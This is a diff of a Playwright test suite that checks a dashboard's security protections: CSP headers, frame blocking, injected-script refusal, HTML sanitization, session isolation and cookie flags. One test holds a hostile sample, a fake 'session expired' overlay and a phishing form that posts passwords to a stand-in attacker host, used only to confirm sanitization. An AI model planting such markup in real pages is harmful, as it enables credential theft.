@@ -14,6 +14,7 @@ import { expect, open, test } from '../../support/fixtures'
 import { ACCEPTANCE_BACKEND_URL } from '../../support/ports'
 import { allowBlockedByPolicy, customComponentOrigins, inlineScriptHashes, parsePolicy, POLICY_DIRECTIVES } from './support/csp'
 import { allowExternalQuickSightWidget, listCell, navigation } from './support/ui'
+import { openRecord } from '../widgets/widget-support'
 
 /**
  * Another web site on its own loopback origin (a real server: Chromium's local network access
@@ -34,7 +35,7 @@ async function serveOtherSite(body: string): Promise<{ url: string; close: () =>
 }
 
 test.describe('dashboard security headers', () => {
-  test('[SEC-038] every dashboard document gets the strict policy, which allows exactly its own inline scripts', async ({ page, backend, diagnostics }) => {
+  test('[SEC-038] every dashboard document gets the strict policy, which allows exactly its own inline scripts @mobile', async ({ page, backend, diagnostics }) => {
     const componentOrigins = await customComponentOrigins(backend.api)
     for (const [path, status] of [['/login', 200], ['/token', 200], ['/app', 200], ['/app/person', 200], ['/app/person/2', 200], ['/app/person/2/edit', 200], ['/app/person/2/no/such/page', 404]] as const) {
       const response = await page.request.get(path)
@@ -79,7 +80,7 @@ test.describe('dashboard security headers', () => {
     expect(diagnostics.cspViolations).toEqual([])
   })
 
-  test('[SEC-038] another web site cannot frame the dashboard', async ({ page, backend, diagnostics }) => {
+  test('[SEC-038] another web site cannot frame the dashboard @mobile', async ({ page, backend, diagnostics }) => {
     void backend
     // each engine reports the refused frame in its own words, some as a failed frame request
     diagnostics.allow(/frame-ancestors|X-Frame-Options/)
@@ -105,7 +106,7 @@ test.describe('dashboard security headers', () => {
     }
   })
 
-  test('[SEC-038] script injected into a page is refused and reported', async ({ page, backend, diagnostics }) => {
+  test('[SEC-038] script injected into a page is refused and reported @mobile', async ({ page, backend, diagnostics }) => {
     void backend
     allowExternalQuickSightWidget(diagnostics)
     // the violation events, and each engine's console report of them (all name script-src)
@@ -129,7 +130,7 @@ test.describe('dashboard security headers', () => {
     expect(diagnostics.cspViolations.every((violation) => /^script-src/.test(violation))).toBe(true)
   })
 
-  test('[SEC-040] origins the application configures are allowed and nothing else: QuickSight embed, images, audio and custom components', async ({ page, backend, diagnostics }) => {
+  test('[SEC-040] origins the application configures are allowed and nothing else: QuickSight embed, images, audio and custom components @mobile', async ({ page, backend, diagnostics }) => {
     const [componentOrigin] = await customComponentOrigins(backend.api)
     const policy = parsePolicy((await page.request.get('/app/widgetGallery')).headers()['content-security-policy'])
     // added by the application's override hook (the fixture's loopback service) ...
@@ -182,7 +183,7 @@ test.describe('security review fixes (QRun-IO/qqq#696)', () => {
     }
   })
 
-  test('[SEC-042] stored HTML cannot add forms, style sheets or page-covering overlays', async ({ page, backend, diagnostics }) => {
+  test('[SEC-042] stored HTML cannot add forms, style sheets or page-covering overlays @mobile', async ({ page, backend, diagnostics }) => {
     void diagnostics
     const overlay = '<div style="position: fixed; inset: 0; z-index: 9999; background: white">Your session expired. Sign in again.</div>'
     const phishing = '<form action="https://evil.example/collect" method="post"><input name="password" type="password"><button>Sign in</button></form>'
@@ -193,9 +194,10 @@ test.describe('security review fixes (QRun-IO/qqq#696)', () => {
     // stored as entered; the UI sanitizes when rendering
     expect((await backend.sql(`select html_value from field_lab where id = ${id}`))[0].html_value).toContain('<form')
 
-    await page.goto(`/app/fieldLab/${id}`, { waitUntil: 'domcontentloaded' })
+    // (on a phone the record sections are an accordion: open them all)
+    await openRecord(page, `/app/fieldLab/${id}`)
     await expect(page.getByRole('heading', { level: 1, name: 'Hostile Html' })).toBeVisible()
-    const value = page.locator('[data-qqq-id="field-value-htmlValue"]').first()
+    const value = page.locator('[data-qqq-id="field-value-htmlValue"]').filter({ visible: true }).first()
     await expect(value.locator('b')).toHaveText('bold')
     await expect(value).toContainText('Your session expired. Sign in again.')
     await expect(value.locator('form, input, button, style')).toHaveCount(0)
@@ -206,7 +208,7 @@ test.describe('security review fixes (QRun-IO/qqq#696)', () => {
     await expect(page.locator('input[name="password"]')).toHaveCount(0)
   })
 
-  test('[SEC-043] a different user signing in on the same browser never sees the previous user\'s recent records', async ({ page, backend, diagnostics }) => {
+  test('[SEC-043] a different user signing in on the same browser never sees the previous user\'s recent records @mobile', async ({ page, backend, diagnostics }) => {
     allowExternalQuickSightWidget(diagnostics)
     const recentPet = page.locator('[data-qqq-id="dashboard-recent-1"]').filter({ hasText: 'Charlie' })
     await open(page, '/app/pet/1')
@@ -229,7 +231,7 @@ test.describe('security review fixes (QRun-IO/qqq#696)', () => {
     await expect(listCell(page, 'Person', 'Avery')).toBeVisible()
   })
 
-  test('[SEC-044] session cookies are SameSite=Lax and Secure behind HTTPS', async ({ page, backend, diagnostics, context }) => {
+  test('[SEC-044] session cookies are SameSite=Lax and Secure behind HTTPS @mobile', async ({ page, backend, diagnostics, context }) => {
     allowExternalQuickSightWidget(diagnostics)
     // manageSession issues sessionUUID; every API call refreshes the mock sessionId
     const cookieFrom = async (path: string, name: string, headers: Record<string, string> = {}) => {
